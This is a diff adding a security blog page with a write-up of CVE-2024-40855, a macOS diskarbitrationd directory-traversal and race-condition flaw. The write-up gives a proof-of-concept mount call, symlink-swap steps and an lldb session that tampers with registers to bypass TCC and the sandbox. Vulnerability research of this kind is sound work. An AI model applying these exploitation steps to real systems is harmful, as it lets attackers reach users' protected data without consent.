@@ -1,0 +1,1515 @@
+
+
+<!DOCTYPE html>
+<html lang="ko-KR" data-default-color-scheme="&#34;auto&#34;">
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" type="image/png" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="&lt;p&gt;&lt;img src=&#34;/2025/01/19/clalxk/MacOS_TCC-Bypass_en/TCC_Bypass.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Dreaming of becoming a future Apple picker, I&amp;#x2019;m back with another macOS vulnerability&amp;#x2014;this time, a TCC Bypass! &amp;#x1F34F;&lt;/p&gt;
+&lt;p&gt;&amp;#x1F517; &lt;strong&gt;Related post:&lt;/strong&gt; &lt;a href=&#34;https://hackyboiz.github.io/2024/11/27/clalxk/CVE-2024-44175/&#34;&gt;CVE-2024-44175 - macOS &lt;code&gt;diskarbitrationd&lt;/code&gt; Sandbox Escape&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;In my previous post, I covered a vulnerability in the &lt;code&gt;diskarbitrationd&lt;/code&gt; system daemon that allowed attackers to bypass the sandbox or elevate privileges through filesystem manipulation.&lt;/p&gt;
+&lt;p&gt;Today, we&amp;#x2019;re diving into &lt;strong&gt;CVE-2024-40855&lt;/strong&gt;, another flaw in &lt;code&gt;diskarbitrationd&lt;/code&gt; that not only &lt;strong&gt;escapes the sandbox&lt;/strong&gt; but also allows mounting into the user&amp;#x2019;s &lt;strong&gt;Transparency, Consent, and Control (TCC)&lt;/strong&gt; directory. This vulnerability exploits a &lt;strong&gt;Directory Traversal attack&lt;/strong&gt; in &lt;code&gt;diskarbitrationd&lt;/code&gt;.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;1-TCC-Bypass&#34;&gt;&lt;a href=&#34;#1-TCC-Bypass&#34; class=&#34;headerlink&#34; title=&#34;1. TCC Bypass?&#34;&gt;&lt;/a&gt;1. TCC Bypass?&lt;/h1&gt;&lt;p&gt;Transparency, Consent, and Control (TCC) is &lt;strong&gt;Apple&amp;#x2019;s security framework&lt;/strong&gt; that governs app permissions for accessing &lt;strong&gt;sensitive user data&lt;/strong&gt;. Users can manage these permissions via the &lt;code&gt;Settings&lt;/code&gt; app.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/19/clalxk/MacOS_TCC-Bypass_en/image1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Ever seen a popup asking, &lt;em&gt;&amp;#x201C;Do you want to allow microphone access?&amp;#x201D;&lt;/em&gt;?&lt;/p&gt;
+&lt;p&gt;That&amp;#x2019;s TCC in action&amp;#x2014;macOS&amp;#x2019;s &lt;strong&gt;app permission management system&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;A &lt;strong&gt;TCC Bypass&lt;/strong&gt; occurs when an attacker gains unauthorized access to sensitive user data (e.g., photos, microphone, location) &lt;strong&gt;without the user&amp;#x2019;s consent&lt;/strong&gt;.&lt;/p&gt;
+&lt;h1 id=&#34;2-Vulnerability-Overview&#34;&gt;&lt;a href=&#34;#2-Vulnerability-Overview&#34; class=&#34;headerlink&#34; title=&#34;2. Vulnerability Overview&#34;&gt;&lt;/a&gt;2. Vulnerability Overview&lt;/h1&gt;&lt;h3 id=&#34;CVE-2024-40855&#34;&gt;&lt;a href=&#34;#CVE-2024-40855&#34; class=&#34;headerlink&#34; title=&#34;CVE-2024-40855&#34;&gt;&lt;/a&gt;CVE-2024-40855&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;A directory traversal vulnerability in diskarbitrationd, a macOS system daemon, allows an attacker to bypass TCC protections by mounting unauthorized paths.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;Version-Information&#34;&gt;&lt;a href=&#34;#Version-Information&#34; class=&#34;headerlink&#34; title=&#34;Version Information&#34;&gt;&lt;/a&gt;&lt;strong&gt;Version Information&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;macOS : 13.0 &amp;#x2264; 14.6&lt;/p&gt;
+&lt;h3 id=&#34;diskarbitrationd&#34;&gt;&lt;a href=&#34;#diskarbitrationd&#34; class=&#34;headerlink&#34; title=&#34;diskarbitrationd&#34;&gt;&lt;/a&gt;&lt;strong&gt;diskarbitrationd&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;The &lt;code&gt;diskarbitrationd&lt;/code&gt; daemon has three key characteristics:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Runs &lt;strong&gt;as root&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Accessible &lt;strong&gt;from within the sandbox&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Has the &lt;strong&gt;&lt;code&gt;com.apple.private.security.storage-exempt.heritable&lt;/code&gt;&lt;/strong&gt; attribute, effectively granting it &lt;strong&gt;Full Disk Access&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Because of these, Apple implements &lt;strong&gt;strict validation mechanisms&lt;/strong&gt; to prevent sandbox escapes and unauthorized mounting to TCC-protected directories.&lt;/p&gt;
+&lt;p&gt;Sandbox validation includes:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Mount Path Validation&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;The client-side logic checks for &lt;code&gt;../&lt;/code&gt; (directory traversal) and ensures &lt;strong&gt;path resolution&lt;/strong&gt; does not bypass security checks (e.g., via symlink attacks).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Sandbox Verification&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;diskarbitrationd&lt;/code&gt; calls &lt;code&gt;sandbox_check_by_audit_token&lt;/code&gt; to determine if the requesting process has access to the specified files/directories.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Kernel-Level Mount Validation&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;The kernel enforces additional restrictions on external mount requests, rejecting any paths containing symbolic links when the &lt;code&gt;k&lt;/code&gt; option is used.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;These three layers of validation are supposed to prevent sandbox escapes and unauthorized TCC access.&lt;/p&gt;
+&lt;h3 id=&#34;&amp;#x1F525;-Bypassing-Client-Side-Mount-Path-Validation&#34;&gt;&lt;a href=&#34;#&amp;#x1F525;-Bypassing-Client-Side-Mount-Path-Validation&#34; class=&#34;headerlink&#34; title=&#34;&amp;#x1F525; Bypassing Client-Side Mount Path Validation&#34;&gt;&lt;/a&gt;&amp;#x1F525; Bypassing Client-Side Mount Path Validation&lt;/h3&gt;&lt;p&gt;The flaw lies in the &lt;strong&gt;first step&lt;/strong&gt;&amp;#x2014;Mount Path Validation.&lt;/p&gt;
+&lt;p&gt;This check happens &lt;strong&gt;on the client-side&lt;/strong&gt; within Apple&amp;#x2019;s &lt;code&gt;DiskArbitration&lt;/code&gt; framework, specifically in the function &lt;code&gt;DADiskMountWithArgumentsCommon&lt;/code&gt;. An attacker can &lt;strong&gt;completely bypass this validation&lt;/strong&gt; by skipping &lt;code&gt;DiskArbitration&lt;/code&gt; and calling &lt;code&gt;diskarbitrationd&lt;/code&gt; &lt;strong&gt;directly&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;By doing this, the attacker can:&lt;/p&gt;
+&lt;p&gt;&amp;#x2705; &lt;strong&gt;Pass a mount path containing &lt;code&gt;../&lt;/code&gt; elements&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#x2705; &lt;strong&gt;Bypass sandbox checks&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#x2705; &lt;strong&gt;Bypass symlink restrictions&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Here&amp;#x2019;s the relevant part of the &lt;code&gt;DADiskMountWithArgumentsCommon&lt;/code&gt; function:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;__private_extern__ &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;DADiskMountWithArgumentsCommon&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;( DADiskRef disk,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                               CFURLRef            path,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                               DADiskMountOptions  options,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                               DADiskMountCallback callback,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                               &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; *              context,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                               CFStringRef         arguments[],&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                               &lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt;                block )&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
+...
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( path )
+    {
+        &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; * _path;
+        _path = ___CFURLCopyFileSystemRepresentation( path );
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( _path )
+        {
+            &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; name[MAXPATHLEN];
+            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( realpath( _path, name ) )
+            {
+                path = CFURLCreateFromFileSystemRepresentation( kCFAllocatorDefault, ( &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; * ) name, &lt;span class=&#34;hljs-built_in&#34;&gt;strlen&lt;/span&gt;( name ), TRUE );
+            }
+            &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
+            {
+                CFRetain( path );
+            }
+            &lt;span class=&#34;hljs-built_in&#34;&gt;free&lt;/span&gt;( _path );
+        }
+        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
+        {
+            CFRetain( path );
+        }
+    }
+    status = kDAReturnBadArgument;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( disk )
+    {
+        status = _DAAuthorize( _DADiskGetSession( disk ), _kDAAuthorizeOptionIsOwner, disk, _kDAAuthorizeRightMount );
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( status == kDAReturnSuccess )
+        {
+            status = __DAQueueRequest( _DADiskGetSession( disk ), _kDADiskMount, disk, options, path ? CFURLGetString( path ) : &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, argument, callback, context, block );
+        }
+    }
+...
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;In the code above, the &lt;code&gt;realpath&lt;/code&gt; and &lt;code&gt;CFURLCreateFromFileSystemRepresentation&lt;/code&gt; function calls are responsible for stripping &lt;code&gt;../&lt;/code&gt; elements. However, since this validation occurs on the client side, an attacker can completely bypass it by calling &lt;code&gt;diskarbitrationd&lt;/code&gt; directly. By skipping the &lt;code&gt;DiskArbitration&lt;/code&gt; framework and passing a path containing &lt;code&gt;../&lt;/code&gt; elements directly to &lt;code&gt;diskarbitrationd&lt;/code&gt;, it becomes possible to evade sandbox restrictions and mount a TCC-protected directory.&lt;/p&gt;
+&lt;p&gt;These functions sanitize paths &lt;strong&gt;only on the client side&lt;/strong&gt;. If an attacker &lt;strong&gt;calls &lt;code&gt;diskarbitrationd&lt;/code&gt; directly&lt;/strong&gt;, they can inject a &lt;code&gt;../&lt;/code&gt; traversal attack &lt;strong&gt;before validation occurs&lt;/strong&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;Explain-1-Mounting-Library-Application-Support-com-apple-TCC&#34;&gt;&lt;a href=&#34;#Explain-1-Mounting-Library-Application-Support-com-apple-TCC&#34; class=&#34;headerlink&#34; title=&#34;Explain 1 : Mounting ~/Library/Application Support/com.apple.TCC&#34;&gt;&lt;/a&gt;Explain 1 : Mounting &lt;code&gt;~/Library/Application Support/com.apple.TCC&lt;/code&gt;&lt;/h3&gt;&lt;p&gt;Let&amp;#x2019;s walk through how to exploit this vulnerability to mount the user&amp;#x2019;s &lt;strong&gt;TCC directory&lt;/strong&gt; and modify &lt;code&gt;TCC.db&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Step 1: Call &lt;code&gt;DAMount&lt;/code&gt; with a Traversal Path&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;/private/tmp/starthere/../../../Users/crab/Library/Application Support/com.apple.TCC&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We provide a crafted path with &lt;code&gt;../&lt;/code&gt; elements.&lt;/p&gt;
+&lt;p&gt;&amp;#x26A0;&amp;#xFE0F; &lt;strong&gt;Key Trick:&lt;/strong&gt; Ensure the client does not interpret the path before it reaches &lt;code&gt;diskarbitrationd&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Step 2: Manipulate Symlinks During &lt;code&gt;sandbox_check_by_audit_token&lt;/code&gt; Execution&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;1&amp;#xFE0F;&amp;#x20E3; Create a symbolic link&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;/private/tmp/starthere -&amp;gt; /private/tmp/1/2/3&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;2&amp;#xFE0F;&amp;#x20E3; When &lt;code&gt;sandbox_check_by_audit_token&lt;/code&gt; checks the path, the following &lt;strong&gt;unexpected transformation&lt;/strong&gt; occurs:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;/private/tmp/Users/crab/Library/Application Support/com.apple.TCC&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;3&amp;#xFE0F;&amp;#x20E3; Next, create a directory structure that &lt;strong&gt;mimics&lt;/strong&gt; the expected validation path:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;/private/tmp/1/2/3/../../../Users/crab/Library/Application Support/com.apple.TCC
+/private/tmp/Users/crab/Library/Application Support/com.apple.TCC&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;As a result, this path is allowed to be mounted inside &lt;code&gt;/private/tmp/&lt;/code&gt;, enabling it to pass security checks.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;3. Remove the Symbolic Link and Execute the Mount&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;/private/tmp/**starthere**/../../../Users/crab/Library/Application Support/com.apple.TCC&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Once the &lt;code&gt;sandbox_check_by_audit_token&lt;/code&gt; check is complete, delete the symbolic link and replace it with an empty directory. After that, &lt;code&gt;diskarbitrationd&lt;/code&gt; will execute the external mount command again, using the same path as before.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;/Users/crab/Library/Application Support/com.apple.TCC&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;However, this time, &lt;code&gt;starthere&lt;/code&gt; is a &lt;strong&gt;directory&lt;/strong&gt; instead of a &lt;strong&gt;symbolic link&lt;/strong&gt;, meaning the final transformation remains the same as before.&lt;/p&gt;
+&lt;p&gt;Since the path no longer contains a symbolic link, the &lt;strong&gt;kernel will process it as a regular path&lt;/strong&gt;. Moreover, because the calling process is &lt;code&gt;diskarbitrationd&lt;/code&gt;, which possesses the &lt;code&gt;com.apple.private.security.storage-exempt.heritable&lt;/code&gt; privilege, it is able to &lt;strong&gt;bypass the kernel&amp;#x2019;s Mandatory Access Control Framework (MACF) Sandbox checks&lt;/strong&gt;. As a result, this method works even within the sandbox.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;4. TCC Bypass and Sandbox Escape&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;By following &lt;strong&gt;steps 1&amp;#x2013;3&lt;/strong&gt;, you can successfully perform a &lt;strong&gt;TCC Bypass&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;To further &lt;strong&gt;escape the sandbox&lt;/strong&gt;, you can &lt;strong&gt;mount the &lt;code&gt;~/Library/Preferences&lt;/code&gt; directory&lt;/strong&gt; using a similar technique. By doing so, you can place a custom Terminal preference file that &lt;strong&gt;automatically executes specific commands&lt;/strong&gt; when Terminal is opened.&lt;/p&gt;
+&lt;p&gt;In essence, this vulnerability is a &lt;strong&gt;Time of Check to Time of Use (TOCTOU) bug&lt;/strong&gt;, functioning similarly to the vulnerability described in &lt;a href=&#34;https://hackyboiz.github.io/2024/11/27/clalxk/CVE-2024-44175/&#34;&gt;a previous post&lt;/a&gt;.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;Explain-2&#34;&gt;&lt;a href=&#34;#Explain-2&#34; class=&#34;headerlink&#34; title=&#34;Explain 2&#34;&gt;&lt;/a&gt;Explain 2&lt;/h3&gt;&lt;p&gt;Let&amp;#x2019;s replicate &lt;strong&gt;Explain 1&lt;/strong&gt; using a debugger.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#import &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;DiskArbitration/DiskArbitration.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-meta&#34;&gt;#import &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;Foundation/Foundation.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt;)&lt;/span&gt; &lt;/span&gt;{
+    DASessionRef session = DASessionCreate(kCFAllocatorDefault);
+    DADiskRef disk = DADiskCreateFromBSDName(kCFAllocatorDefault, session, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/dev/disk6s1&amp;quot;&lt;/span&gt;);
+    CFDictionaryRef properties;
+    CFURLRef diskurl = (__bridge CFURLRef)[NSURL fileURLWithPath:@&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/dev/disk6s1&amp;quot;&lt;/span&gt;];
+    CFURLRef url = (__bridge CFURLRef)[NSURL fileURLWithPath:@&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/private/tmp/starthere/../../../Users/crab/Library/Application Support/com.apple.TCC&amp;quot;&lt;/span&gt;];
+    DADiskMount(disk, url, kDADiskMountOptionDefault, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The code above attempts to mount a disk at the path:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/private/tmp/starthere/../../../Users/crab/Library/Application Support/com.apple.TCC&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Compile the code, start debugging using &lt;code&gt;lldb&lt;/code&gt;, and set the following breakpoints:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;(lldb) breakpoint list
+Current breakpoints:
+1: name = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;realpath&amp;apos;&lt;/span&gt;, locations = 1, resolved = 1, hit count = 0
+  1.1: &lt;span class=&#34;hljs-built_in&#34;&gt;where&lt;/span&gt; = libsystem_c.dylib`realpath, address = 0x00000001921de874, resolved, hit count = 0 
+2: name = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;DADiskMountWithArgumentsCommon&amp;apos;&lt;/span&gt;, locations = 1, resolved = 1, hit count = 1
+  2.1: &lt;span class=&#34;hljs-built_in&#34;&gt;where&lt;/span&gt; = DiskArbitration`DADiskMountWithArgumentsCommon, address = 0x000000019a1bdb48, resolved, hit count = 1 
+3: address = DiskArbitration[0x0000000188325c1c], locations = 1, resolved = 1, hit count = 1
+  3.1: &lt;span class=&#34;hljs-built_in&#34;&gt;where&lt;/span&gt; = DiskArbitration`DADiskMountWithArgumentsCommon + 212, address = 0x000000019a1bdc1c, resolved, hit count = 1 
+4: name = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;__DAQueueRequest&amp;apos;&lt;/span&gt;, locations = 1, resolved = 1, hit count = 1
+  4.1: &lt;span class=&#34;hljs-built_in&#34;&gt;where&lt;/span&gt; = DiskArbitration`__DAQueueRequest, address = 0x000000019a1bcde0, resolved, hit count = 1&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Attach &lt;code&gt;lldb&lt;/code&gt; to the &lt;code&gt;diskarbitrationd&lt;/code&gt; process and set a breakpoint for &lt;code&gt;sandbox_check_by_audit_token&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;(lldb) breakpoint list
+Current breakpoints:
+2: name = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;sandbox_check_by_audit_token&amp;apos;&lt;/span&gt;, locations = 1, resolved = 1, hit count = 4
+  2.1: where = libsystem_sandbox.dylib`sandbox_check_by_audit_token,&lt;span class=&#34;hljs-built_in&#34;&gt; address &lt;/span&gt;= 0x000000019d5a61cc, resolved, hit count = 4&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Prepare the required &lt;strong&gt;symbolic links and directories&lt;/strong&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs gradle&#34;&gt;ln -s &lt;span class=&#34;hljs-regexp&#34;&gt;/private/&lt;/span&gt;tmp&lt;span class=&#34;hljs-regexp&#34;&gt;/deep/&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-regexp&#34;&gt;/2 /&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt;&lt;span class=&#34;hljs-regexp&#34;&gt;/tmp/&lt;/span&gt;starthere
+mkdir -p &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/private/tmp/Users/crab/Library/Application Support/com.apple.TCC/&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;Debugging with LLDB After Execution&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Run the program and reach a breakpoint&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;(lldb) run
+Process 1591 launched: &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;/Users/crab/m&amp;apos;&lt;/span&gt; (arm64)
+Process 1591 stopped
+* thread #1,&lt;span class=&#34;hljs-built_in&#34;&gt; queue &lt;/span&gt;= &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;com.apple.main-thread&amp;apos;&lt;/span&gt;, stop reason = breakpoint 2.1&lt;/code&gt;&lt;/pre&gt;
+&lt;ol&gt;
+&lt;li&gt;Perform a memory dump on the address pointed to by the &lt;code&gt;X1&lt;/code&gt; register&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs angelscript&#34;&gt;(lldb) memory read -f p $x1
+&lt;span class=&#34;hljs-number&#34;&gt;0x600000024060&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0x01000001fa131911&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x0001cc4fc6001d80&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x0800010060015821&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x0000600000f24000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;ol&gt;
+&lt;li&gt;Verify the path string&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs angelscript&#34;&gt;(lldb) memory read -f s &lt;span class=&#34;hljs-number&#34;&gt;0x0000600000f24000&lt;/span&gt;+&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;0x600000f24010&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;^file:///private/tmp/starthere/../../../Users/crab/Library/Application%20Support/com.apple.TCC/&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;ol&gt;
+&lt;li&gt;Stop at the &lt;code&gt;__DAQueueRequest&lt;/code&gt; breakpoint and check the value of the &lt;code&gt;X4&lt;/code&gt; register&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs arduino&#34;&gt;(lldb) &lt;span class=&#34;hljs-keyword&#34;&gt;register&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;read&lt;/span&gt; $x4
+      x4 = &lt;span class=&#34;hljs-number&#34;&gt;0x0000600000020000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;ol&gt;
+&lt;li&gt;Verify the path string&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs perl&#34;&gt;(lldb) memory &lt;span class=&#34;hljs-keyword&#34;&gt;read&lt;/span&gt; -f &lt;span class=&#34;hljs-keyword&#34;&gt;s&lt;/span&gt; $x4+&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;0x600000020010&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Kfile:///private/tmp/Users/crab/Library/Application%20Support/com.apple.TCC/&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;ol&gt;
+&lt;li&gt;Overwrite the &lt;code&gt;X4&lt;/code&gt; register with the original path value&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs arduino&#34;&gt;(lldb) &lt;span class=&#34;hljs-keyword&#34;&gt;register&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;write&lt;/span&gt; $x4 &lt;span class=&#34;hljs-number&#34;&gt;0x0000600000f24000&lt;/span&gt;
+(lldb) c
+&lt;span class=&#34;hljs-built_in&#34;&gt;Process&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;1606&lt;/span&gt; resuming&lt;/code&gt;&lt;/pre&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li&gt;The &lt;code&gt;diskarbitrationd&lt;/code&gt; process stops at the &lt;code&gt;sandbox_check_by_audit_token&lt;/code&gt; breakpoint.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;(lldb) c
+Process 113 resuming
+Process 113 stopped
+* thread #2,&lt;span class=&#34;hljs-built_in&#34;&gt; queue &lt;/span&gt;= &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;DAServer&amp;apos;&lt;/span&gt;, stop reason = breakpoint 2.1&lt;/code&gt;&lt;/pre&gt;
+&lt;ol&gt;
+&lt;li&gt;Verify that the path remains unchanged via memory dump&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs stata&#34;&gt;(lldb) &lt;span class=&#34;hljs-keyword&#34;&gt;memory&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;read&lt;/span&gt; -f s 0x000000014ea0cc90
+0x14ea0cc90: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/private/tmp/starthere/../../../Users/crab/Library/Application Support/com.apple.TCC&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;ol&gt;
+&lt;li&gt;Check the return value after calling &lt;code&gt;sandbox_check_by_audit_token&lt;/code&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs arduino&#34;&gt;(lldb) finish
+(lldb) &lt;span class=&#34;hljs-keyword&#34;&gt;register&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;read&lt;/span&gt; $x0
+      x0 = &lt;span class=&#34;hljs-number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
